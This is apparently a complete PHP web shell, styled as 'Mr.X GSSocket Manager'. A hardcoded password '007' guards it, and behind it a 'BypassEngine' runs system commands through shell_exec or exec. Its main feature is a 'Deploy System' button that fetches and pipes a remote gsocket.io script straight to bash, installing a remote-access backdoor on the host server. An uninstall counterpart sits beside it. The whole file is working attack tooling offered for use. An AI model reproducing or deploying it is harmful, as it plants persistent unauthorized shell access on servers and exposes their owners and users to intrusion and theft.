<?php
session_start();
$password = "007";

if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ?");
    exit;
}

if(isset($_POST['pass'])){
    if($_POST['pass'] === $password){
        $_SESSION['auth'] = true;
    } else {
        $error = "Invalid Password";
    }
}

if(empty($_SESSION['auth'])){
?>
<!DOCTYPE html>
<html>
<head>
<title>Mr.X Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
body{
    background:#05050a;
    font-family:'Inter',sans-serif;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    margin:0;
}
.login-card{
    background:rgba(20,20,35,0.85);
    backdrop-filter:blur(20px);
    padding:50px;
    border-radius:20px;
    box-shadow:0 0 50px rgba(0,255,255,0.2);
    text-align:center;
    width:400px;
}
input{
    width:100%;
    padding:15px;
    margin:15px 0;
    border-radius:10px;
    border:none;
    background:#111;
    color:#0ff;
    font-size:16px;
    outline:none;
}
button{
    width:100%;
    padding:15px;
    font-size:16px;
    border-radius:10px;
    border:none;
    background:#00ffff;
    color:#05050a;
    font-weight:700;
    cursor:pointer;
    transition:0.3s;
}
button:hover{
    background:#0ff;
    box-shadow:0 0 15px #0ff;
    transform:translateY(-2px);
}
.error{
    color:#ff4d4d;
    font-weight:700;
    margin-bottom:15px;
}
</style>
</head>
<body>
<div class="login-card">
<h2>🔐 Mr.X Access</h2>
<?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
<form method="POST">
<input type="password" name="pass" placeholder="Enter Password" autofocus required>
<button>Login</button>
</form>
</div>
</body>
</html>
<?php exit; }

class BypassEngine {
    public static function run($cmd){
        if(function_exists('shell_exec')) return shell_exec($cmd." 2>&1");
        if(function_exists('exec')) { exec($cmd." 2>&1",$o); return implode("\n",$o); }
        return "Execution blocked on this server";
    }
}

if(isset($_POST['gs_act'])){
    header("Content-Type: application/json");
    $act = $_POST['gs_act'];
    $output = "";

    if($act=="install"){
        $output .= "[1] gsocket.io: ".BypassEngine::run("curl -fsSL https://gsocket.io/y | bash")."\n";
    } elseif($act=="uninstall"){
        $output .= "[UNINSTALL] ".BypassEngine::run("GS_UNDO=1 bash -c '$(curl -fsSL https://gsocket.io/y)'")."\n";
    }

    echo json_encode(["out"=>$output]);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<title>Mr.X GSSocket Manager</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
:root{
    --bg:#05050a;
    --card:rgba(10,10,25,0.95);
    --accent:#00ffff;
    --red:#ff4d4d;
    --text:#e2e8f0;
    --text-muted:#94a3b8;
}
body{
    background:var(--bg);
    font-family:'Inter',sans-serif;
    color:var(--text);
    display:flex;
    justify-content:center;
    align-items:flex-start;
    min-height:100vh;
    margin:0;
    padding:20px;
}
.container{
    width:100%;
    max-width:900px;
}
.card{
    background:var(--card);
    backdrop-filter:blur(20px);
    border-radius:20px;
    padding:40px;
    box-shadow:0 0 60px rgba(0,255,255,0.2);
    text-align:left;
}
h1{
    font-size:36px;
    margin-bottom:20px;
    color:var(--accent);
    text-align:center;
}
.header p{
    color:var(--text-muted);
    font-size:14px;
    margin-top:10px;
    text-align:center;
}
.btn-group{
    display:flex;
    gap:20px;
    margin-top:20px;
}
button{
    flex:1;
    padding:15px;
    border:none;
    border-radius:12px;
    font-weight:700;
    cursor:pointer;
    transition:0.3s;
    font-size:16px;
    text-align:center;
}
button:hover{
    transform:translateY(-2px);
    opacity:0.95;
    box-shadow:0 0 20px #00ffff;
}
.primary{background:var(--accent); color:#05050a;}
.danger{background:var(--red); color:#fff;}
pre{
    margin-top:25px;
    background:#000;
    border-radius:15px;
    padding:20px;
    font-family:'JetBrains Mono',monospace;
    font-size:13px;
    min-height:300px;
    max-height:600px;
    width:100%;
    overflow:auto;
    resize:vertical;
    white-space:pre-wrap;
    color:#0ff;
    border:1px solid #0ff;
    box-shadow:inset 0 2px 15px rgba(0,255,255,0.4);
    line-height:1.4;
}
.logout{
    position:fixed;
    top:15px;
    right:15px;
    color:var(--text-muted);
    text-decoration:none;
    font-size:12px;
    border:1px solid rgba(0,255,255,0.3);
    padding:6px 12px;
    border-radius:20px;
    transition:0.3s;
}
.logout:hover{ background:rgba(0,255,255,0.1); color:#0ff; }
</style>
</head>
<body>

<a href="?logout=1" class="logout">Logout</a>

<div class="container">
<div class="card">
<div class="header">
<h1>💻 Mr.X GSSocket Manager</h1>
<p>Professional deploy/uninstall tool • Terminal-style log output</p>
</div>

<div class="btn-group">
<button class="primary" onclick="runGS('install')">Deploy System</button>
<button class="danger" onclick="runGS('uninstall')">Kill System</button>
</div>

<pre id="gs-out">System Ready...\n</pre>

<p style="font-size:11px; color:var(--text-muted); margin-top:20px; text-align:center;">&copy; 2026 Mr.X • SHA-007 Secured</p>
</div>
</div>

<script>
function runGS(act){
    const out = document.getElementById("gs-out");
    out.textContent = ">> Executing "+act.toUpperCase()+"...\n";

    const fd = new FormData();
    fd.append("gs_act", act);

    fetch("",{method:"POST", body:fd})
    .then(r=>r.json())
    .then(d=>{
        out.textContent += d.out || "No output";
        out.scrollTop = out.scrollHeight;
    })
    .catch(e=>{
        out.textContent += "\n[ERROR] "+e.message;
        out.scrollTop = out.scrollHeight;
    });
}
</script>

</body>
</html>